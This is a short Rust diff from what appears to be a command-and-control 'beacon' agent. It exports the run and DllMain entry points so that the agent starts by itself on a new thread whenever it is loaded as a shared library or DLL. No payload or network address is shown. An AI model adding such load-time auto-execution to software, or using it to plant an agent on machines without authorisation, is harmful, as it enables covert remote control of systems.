@@ -157,15 +157,16 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
 
 /// Run the agent in a new thread (if loading from a shared library)
 #[ctor::ctor]
+#[no_mangle]
 #[cfg(crate_type = "cdylib")]
-fn run() {
+pub extern fn run() {
     std::thread::spawn(|| real_main().unwrap());
 }
 
 #[no_mangle]
 #[cfg(all(crate_type = "cdylib", target_os = "windows"))]
 #[allow(non_snake_case, unused_variables)]
-extern "system" fn DllMain(
+pub extern "system" fn DllMain(
     dll_module: HINSTANCE,
     call_reason: DWORD,
     reserved: LPVOID)
